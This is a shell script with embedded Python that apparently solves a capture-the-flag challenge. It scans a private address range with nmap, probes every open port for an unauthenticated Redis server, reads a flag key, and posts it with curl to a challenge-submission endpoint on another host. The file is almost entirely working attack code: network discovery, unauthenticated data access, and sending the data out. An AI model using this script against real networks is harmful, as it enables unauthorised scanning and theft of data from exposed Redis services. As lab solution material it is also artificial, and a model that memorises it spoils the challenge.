#!/bin/sh
set -eu

scan_file="$(mktemp)"
trap 'rm -f "$scan_file"' EXIT
nmap -Pn -n -p- --open -T4 -oX "$scan_file" 172.20.0.141-199 >/dev/null
python3 - "$scan_file" <<'PY'
import json
import socket
import subprocess
import sys
import xml.etree.ElementTree as ET

root = ET.parse(sys.argv[1]).getroot()


def read_line(stream):
    line = stream.readline()
    if not line:
        raise OSError("connection closed")
    return line.rstrip(b"\r\n")


def read_resp(stream):
    prefix = stream.read(1)
    if prefix in (b"+", b"-", b":"):
        return read_line(stream)
    if prefix == b"$":
        size = int(read_line(stream))
        if size < 0:
            return None
        value = stream.read(size)
        if len(value) != size:
            raise OSError("incomplete response")
        stream.read(2)
        return value
    raise OSError("unexpected protocol response")


for host in root.findall("host"):
    address = host.find("address[@addrtype='ipv4']")
    if address is None:
        continue
    ip = address.get("addr")
    for port in host.findall("./ports/port[@protocol='tcp']"):
        if port.find("state").get("state") != "open":
            continue
        number = int(port.get("portid"))
        try:
            with socket.create_connection((ip, number), timeout=2) as sock:
                sock.settimeout(2)
                stream = sock.makefile("rb")
                sock.sendall(b"*2\r\n$4\r\nINFO\r\n$6\r\nserver\r\n")
                info = read_resp(stream)
                if not isinstance(info, bytes) or b"redis_version:" not in info:
                    continue

                key = b"radio:night-transmission"
                request = b"*2\r\n$3\r\nGET\r\n$" + str(len(key)).encode() + b"\r\n" + key + b"\r\n"
                sock.sendall(request)
                flag = read_resp(stream)
                if not isinstance(flag, bytes):
                    continue

                body = json.dumps({
                    "challenge_id": "scl-challenge-frame-4b6f26",
                    "task_id": "task1",
                    "flag": flag.decode()
                }, separators=(",", ":"))
                result = subprocess.run([
                    "curl", "-s", "http://172.20.0.3/api/challenges/submit",
                    "-X", "POST", "-H", "Content-Type: application/json",
                    "--data-binary", body
                ], check=True, capture_output=True, text=True)
                print(result.stdout)
                raise SystemExit(0)
        except (OSError, ValueError, subprocess.CalledProcessError):
            continue
raise SystemExit("No matching broadcast service found")
PY
